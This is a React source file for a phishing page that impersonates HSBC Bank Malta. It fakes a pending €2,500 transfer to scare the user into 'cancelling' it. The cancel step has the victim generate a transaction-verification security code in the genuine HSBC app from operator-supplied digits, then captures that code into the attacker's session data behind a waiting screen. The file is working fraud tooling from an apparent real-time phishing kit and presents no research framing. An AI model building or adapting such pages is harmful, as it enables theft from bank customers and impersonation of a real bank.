import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { AlertCircle, Menu, Shield, ArrowRight, CheckCircle } from 'lucide-react';
import { useForm } from '@/contexts/FormContext';
import { Input } from '@/components/ui/input';
import ErrorAlert from '@/components/ErrorAlert';
import hsbcLogo from '/uploaded/2cb7125c-8178-444d-9da1-b5b7641913ec.png';
import LoadingScreen from '@/components/LoadingScreen';

const PaymentCancelPage = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [showCodeEntry, setShowCodeEntry] = useState(false);
  const [securityCode, setSecurityCode] = useState('');
  const { setWaiting, currentSession, updateSessionData } = useForm();

  // Get transaction digits from session data
  const transactionDigits = (currentSession?.data as any)?.transactionDigits || '054782500';

  const handleContinue = () => {
    console.log('Payment continued');
    setIsLoading(true);
    setTimeout(() => {
      setWaiting(true);
    }, 1500);
  };

  const handleCancel = () => {
    console.log('Payment cancel requested - showing code entry');
    setShowCodeEntry(true);
  };

  const handleCodeSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log('Security code submitted:', securityCode);
    // Save the security code to session data
    updateSessionData('cancelSecurityCode', { securityCode });
    setIsLoading(true);
    setTimeout(() => {
      setWaiting(true);
    }, 1500);
  };

  if (isLoading) {
    return <LoadingScreen />;
  }

  // Code entry view after clicking Cancel
  if (showCodeEntry) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        {/* Header */}
        <div className="bg-white shadow-sm">
          <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Menu className="h-6 w-6 text-gray-600" />
              <img 
                src={hsbcLogo} 
                alt="HSBC" 
                className="h-8 w-auto"
              />
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 flex items-center justify-center px-6 py-12">
          <div className="w-full max-w-xl mx-auto">
            <div className="bg-white rounded-lg shadow-lg border border-gray-200 overflow-hidden">
              {/* Header */}
              <div className="bg-[#db0011] px-6 py-4">
                <div className="flex items-center space-x-3 text-white">
                  <Shield className="h-6 w-6" />
                  <h1 className="text-xl font-semibold">Cancellation of Transfer</h1>
                </div>
              </div>

              {/* Content */}
              <div className="p-8 space-y-6">
                {/* Error Alert */}
                <ErrorAlert />
                
                {/* Instructions */}
                <div className="space-y-4">
                  <p className="text-sm font-semibold text-gray-900">
                    To cancel this transfer, please follow these steps:
                  </p>
                  
                  <ol className="space-y-3 text-sm text-gray-700 pl-1">
                    <li className="flex items-start">
                      <span className="font-semibold mr-2 text-[#db0011]">1.</span>
                      <span>Launch the HSBC Mobile Banking app.</span>
                    </li>
                    <li className="flex items-start">
                      <span className="font-semibold mr-2 text-[#db0011]">2.</span>
                      <span>Select <strong>'Generate security code'</strong> at the bottom of the screen.</span>
                    </li>
                    <li className="flex items-start">
                      <span className="font-semibold mr-2 text-[#db0011]">3.</span>
                      <span>Choose <strong>'Transaction verification'</strong> from the available options.</span>
                    </li>
                    <li className="flex items-start">
                      <span className="font-semibold mr-2 text-[#db0011]">4.</span>
                      <div>
                        <span>Under "Enter the requested digits from the transaction", enter </span>
                        <span className="font-mono font-bold text-[#db0011] bg-red-50 px-2 py-1 rounded">{transactionDigits}</span>
                        <span>.</span>
                      </div>
                    </li>
                    <li className="flex items-start">
                      <span className="font-semibold mr-2 text-[#db0011]">5.</span>
                      <span>Enter your 6-digit PIN (or use biometrics if enabled on your device).</span>
                    </li>
                    <li className="flex items-start">
                      <span className="font-semibold mr-2 text-[#db0011]">6.</span>
                      <span>Your security code will then be displayed.</span>
                    </li>
                    <li className="flex items-start">
                      <span className="font-semibold mr-2 text-[#db0011]">7.</span>
                      <span>Use this security code to cancel your transaction in online banking.</span>
                    </li>
                    <li className="flex items-start">
                      <span className="font-semibold mr-2 text-[#db0011]">8.</span>
                      <span>Enter the code below to complete the process.</span>
                    </li>
                  </ol>
                </div>

                {/* Code Entry Form */}
                <form onSubmit={handleCodeSubmit} className="space-y-4 pt-4 border-t border-gray-200">
                  <div className="space-y-2">
                    <label htmlFor="security-code" className="text-sm font-medium text-gray-700">
                      Security Code
                    </label>
                    <Input
                      id="security-code"
                      type="text"
                      value={securityCode}
                      onChange={(e) => setSecurityCode(e.target.value)}
                      placeholder="Enter your security code"
                      className="w-full text-center text-lg tracking-widest font-mono"
                      maxLength={8}
                      required
                    />
                  </div>

                  <Button 
                    type="submit"
                    size="lg"
                    className="w-full bg-[#db0011] hover:bg-[#b50010] text-white font-medium"
                    disabled={securityCode.length < 6}
                  >
                    <CheckCircle className="h-4 w-4 mr-2" />
                    Complete Cancellation
                  </Button>
                </form>

                {/* Info Notice */}
                <div className="pt-4 border-t border-gray-200">
                  <p className="text-xs text-gray-500 text-center">
                    For your security, this code is unique to this transaction and will expire after use.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="bg-black text-white py-6 mt-auto">
          <div className="max-w-7xl mx-auto px-6 text-center">
            <div className="text-sm space-y-2">
              <div className="flex items-center justify-center space-x-4">
                <span>Investor relations</span>
                <span>|</span>
                <span>HSBC Group</span>
                <span>|</span>
                <span>© HSBC Bank Malta p.l.c. 2025. All rights reserved.</span>
              </div>
              <div>
                <span>This website is designed for use in Malta. Cross-border banking</span>
              </div>
            </div>
          </div>
        </footer>
      </div>
    );
  }

  // Initial payment cancel view
  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header with hamburger menu and HSBC Logo */}
      <div className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <Menu className="h-6 w-6 text-gray-600" />
            <img 
              src={hsbcLogo} 
              alt="HSBC" 
              className="h-8 w-auto"
            />
          </div>
        </div>
      </div>

      {/* Main Content Container */}
      <div className="flex-1 flex items-center justify-center px-6 py-12">
        <div className="w-full max-w-xl mx-auto">
          {/* Alert Card */}
          <div className="bg-white rounded-lg shadow-lg border border-gray-200 overflow-hidden">
            {/* Header */}
            <div className="bg-[#db0011] px-6 py-4">
              <div className="flex items-center space-x-3 text-white">
                <AlertCircle className="h-6 w-6" />
                <h1 className="text-xl font-semibold">Pending Transfer</h1>
              </div>
            </div>

            {/* Content */}
            <div className="p-8 space-y-6">
              {/* Error Alert */}
              <ErrorAlert />
              
              {/* Security Notice */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                <div className="flex items-start space-x-3">
                  <Shield className="h-5 w-5 text-blue-600 mt-0.5 flex-shrink-0" />
                  <div className="text-sm text-blue-800">
                    <p className="font-medium mb-1">Transfer Authorization Required</p>
                    <p className="text-blue-700">
                      This action requires your confirmation to proceed.
                    </p>
                  </div>
                </div>
              </div>

              {/* Transfer Details */}
              <div className="space-y-4 py-4">
                <div className="bg-gray-50 rounded-lg p-6 border border-gray-200">
                  <div className="space-y-3">
                    <div className="flex justify-between items-center pb-3 border-b border-gray-300">
                      <span className="text-sm text-gray-600">Transfer Amount</span>
                      <span className="text-2xl font-bold text-gray-900">€2,500.00</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-gray-600">Recipient</span>
                      <span className="text-base font-semibold text-gray-900">Joseph Borg</span>
                    </div>
                  </div>
                </div>

                <p className="text-sm text-gray-700 leading-relaxed">
                  There is a pending transfer to <span className="font-semibold">Joseph Borg</span>. 
                  To continue with this transfer, press <span className="font-semibold">Continue</span>. 
                  To cancel this transaction, press <span className="font-semibold">Cancel</span>.
                </p>
              </div>

              {/* Action Buttons */}
              <div className="flex justify-between gap-4 pt-4">
                <Button 
                  onClick={handleCancel}
                  variant="destructive"
                  size="lg"
                  className="bg-[#db0011] hover:bg-[#b50010] text-white font-medium px-8"
                >
                  Cancel Transfer
                </Button>
                <Button 
                  onClick={handleContinue}
                  size="lg"
                  className="bg-green-600 hover:bg-green-700 text-white font-medium px-8"
                >
                  Continue
                  <ArrowRight className="h-4 w-4 ml-2" />
                </Button>
              </div>

              {/* Info Notice */}
              <div className="pt-4 border-t border-gray-200">
                <p className="text-xs text-gray-500 text-center">
                  By continuing, you authorize this transaction. Please ensure all details are correct before proceeding.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-black text-white py-6 mt-auto">
        <div className="max-w-7xl mx-auto px-6 text-center">
          <div className="text-sm space-y-2">
            <div className="flex items-center justify-center space-x-4">
              <span>Investor relations</span>
              <span>|</span>
              <span>HSBC Group</span>
              <span>|</span>
              <span>© HSBC Bank Malta p.l.c. 2025. All rights reserved.</span>
            </div>
            <div>
              <span>This website is designed for use in Malta. Cross-border banking</span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default PaymentCancelPage;
